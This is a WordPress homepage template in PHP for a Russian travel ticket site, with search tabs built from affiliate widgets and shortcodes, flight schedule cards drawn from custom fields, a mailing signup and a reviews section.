<?php
/**
 * Template Name: Главная
 *
 */

get_header();

?>

<section class="main" style="background-image: url(<?php echo the_field('kartinka_v_shapku', 3311)?>">
    <div class="conteiner column">
        <div class="wrap-h1">
            <h1>
                <?php echo the_field('zagolovok_v_shapku', 3311)?>
            </h1>
        </div>
        <div class="column">
            <div class="main__wrap-buttons">
                <div class="main__button" data-count="1">
                    <div class="main__button__content main__button__active">
                        <span>Авиа билеты</span>
                    </div>
                </div>
                <div class="main__button" data-count="2">
                    <div class="main__button__content">
                        <span>Чартерные рейсы</span>
                    </div>
                </div>
                <div class="main__button" data-count="3">
                    <div class="main__button__content">
                        <span>ЖД билеты</span>
                    </div>
                </div>
                <div class="main__button" data-count="4">
                    <div class="main__button__content">
                        <span>Автобусы</span>
                    </div>
                </div>
                <div class="main__button" data-count="5">
                    <div class="main__button__content">
                        <span>Туры</span>
                    </div>
                </div>
            </div>
            <div class="main__wrap-form-list">
                <div class="main__wrap-form avia-filter active-form" data-count="1">
                    <?php echo do_shortcode('[tp_search_shortcodes id="1"]')?>
                </div>
                <div class="main__wrap-form charter-filter" data-count="2">
                    <?php echo do_shortcode('[wpf-filters id=2]')?>
                </div>
                <div class="main__wrap-form jd-filter" data-count="3">
                    <script src="https://c45.travelpayouts.com/content?promo_id=1809&shmarker=321113&trs=130415&tab1=1&tab2=1&tab3=&tab4=&tabDef=1&color_scheme=basic_white&hide_logo=true&hide_logo_tab=true&powered_by=false" charset="utf-8" async="true"></script>
                </div>
                <div class="main__wrap-form bus-filter" data-count="4">
                    <script src="//tp.media/content?promo_id=4576&shmarker=321113&campaign_id=45&trs=130415&locale=ru&powered_by=false&border_radius=5&show_logo=false&plain=true&color_background=%23ffffff&color_border=%23FFFFFF&color_button=%23B9110D&color_button_text=%23ffffff" charset="utf-8"></script>
                </div>
                <div class="main__wrap-form turs-filter" data-count="5">
                    <?php echo do_shortcode('[wpf-filters id=5]')?>
                </div>
            </div>
        </div>
    </div>
</section>

    <script charset="utf-8" type="text/javascript" src="http://http://interaviacentr.ru/iframe.js"></script>
<?php if ( have_posts() ) : ?>
    <?php while ( have_posts() ) { the_post(); ?>
        <div class="page-single">
            <main class="page-single__content" role="main">
                <?php
                $thumb = adventure_tours_get_the_post_thumbnail( null, 'thumb_single' );
                if ( $thumb ) {
                    printf( '<div class="margin-bottom">%s</div>', $thumb );
                }
                the_content();
                ?>
            </main>
        </div>
    <?php } ?>
<?php else : ?>
    <?php get_template_part( 'content', 'none' ); ?>
<?php endif; ?>
<section class="schedule">
    <div class="conteiner column">
        <div class="schedule__wrap-h2">
            <h2><?php echo the_field('zvgolovok_raspisanie_charternyh_rejsov', 3311)?></h2>
        </div>
        <div class="schedule__wrap-cards">
            <?php
            $args = array(
                'post_type' => 'chartavia-events',
                'showposts' => "4", //сколько показать статей
                'orderby' => "ASC", //сортировка по дате
                'caller_get_posts' => 1);
            $my_query = new wp_query($args);
            if ($my_query->have_posts()) {
                while ($my_query->have_posts()) {
                    $my_query->the_post();
                    $post_id = get_the_ID();
                    $image = get_field('kartinka_dlya_zapisi', $post_id);
                    ?>
                    <div class="card schedule__card">
                        <div class="ticket-price column">
                            <h3><?php the_title();?></h3>
                            <?php
                            if( have_rows('perechen_rejsov') ):
                                while( have_rows('perechen_rejsov') ) : the_row();
                                    $sub_city = get_sub_field('nazvanie_goroda');
                                    $sub_price = get_sub_field('stoimost');
                                    ?>
                                        <div class="ticket-price__city">
                                            <span><?php  echo $sub_city?></span>
                                            <span><?php  echo $sub_price?></span>
                                        </div>
                                    <?php
                                endwhile;
                            else :
                            endif;?>
                        </div>
                        <div class="card-city" style="background-image: url('<?php  echo $image;?>');"></div>
                    </div>
                <?php }
            }
            wp_reset_query(); ?>
        </div>
        <div class="schedule__wrap__big-but">
            <a href="<?php echo the_field('ssylka_na_knopku', 3311)?>">
                <div class="big__button">
                    <span class="big-small__but_content"><?php echo the_field('nadpis_na_knopke', 3311)?></span>
                </div>
            </a>
        </div>
    </div>
</section>
<section class="mailing">
    <div class="conteiner flex">
        <div class="wrap__svg-letter">
            <img src="<?php echo get_template_directory_uri()?>/images/letter.svg">
        </div>
        <div class="wrap__tx-form column">
            <?php if ( is_active_sidebar( 'sidebar_mailing' ) ) : ?>
                <div id="mailing" class="mailing">
                    <?php dynamic_sidebar( 'sidebar_mailing' ); ?>
                </div>
            <?php endif; ?>
        </div>
    </div>
</section>
<section class="schedule">
    <div class="conteiner column">
        <div class="schedule__wrap-h2">
            <h2><?php echo the_field('zagolovok_raspisanie_aviarejsov', 3311)?></h2>
        </div>
        <div class="schedule__wrap-cards">
            <?php
            $args = array(
                'post_type' => 'avia-events',
                'showposts' => "4", //сколько показать статей
                'orderby' => "ASC", //сортировка по дате
                'caller_get_posts' => 1);
            $my_query = new wp_query($args);
            if ($my_query->have_posts()) {
                while ($my_query->have_posts()) {
                    $my_query->the_post();
                    $post_id = get_the_ID();
                    $image = get_field('kartinka_dlya_zapisi', $post_id);
                    ?>
                    <div class="card schedule__card">
                        <div class="ticket-price column">
                            <h3><?php the_title();?></h3>
                            <?php
                            if( have_rows('perechen_rejsov') ):
                                while( have_rows('perechen_rejsov') ) : the_row();
                                    $sub_city = get_sub_field('nazvanie_goroda');
                                    $sub_price = get_sub_field('stoimost');
                                    ?>
                                    <div class="ticket-price__city">
                                        <span><?php  echo $sub_city?></span>
                                        <span><?php  echo $sub_price?></span>
                                    </div>
                                <?php
                                endwhile;
                            else :
                            endif;?>
                        </div>
                        <div class="card-city" style="background-image: url('<?php  echo $image;?>');"></div>
                    </div>
                <?php }
            }
            wp_reset_query(); ?>
        </div>
        <div class="schedule__wrap__big-but">
            <a href="<?php echo the_field('ssylka_na_knopku_raspisanie_aviarejsov', 3311)?>">
                <div class="big__button">
                    <span class="big-small__but_content"><?php echo the_field('nadpis_na_knopke_raspisanie_aviarejsov', 3311)?></span>
                </div>
            </a>
        </div>
    </div>
</section>
    <section class="reviewes">
        <h2 class="reviewes__title">
            Отзывы
<!--            --><?php //the_field('zagolovok_bloka_otzyvy', 12);?>
        </h2>
        <div class="reviewes__content container">
            <?php echo do_shortcode('[testimonial_view id="1"]')?>
        </div>
        <div class="reviewes__lnk">
            <a class="brown-button" href="<?php echo get_home_url(); ?>/otzyvy/" target="_blank">Ещё отзывы</a>
        </div>
    </section>




<?php get_footer(); ?>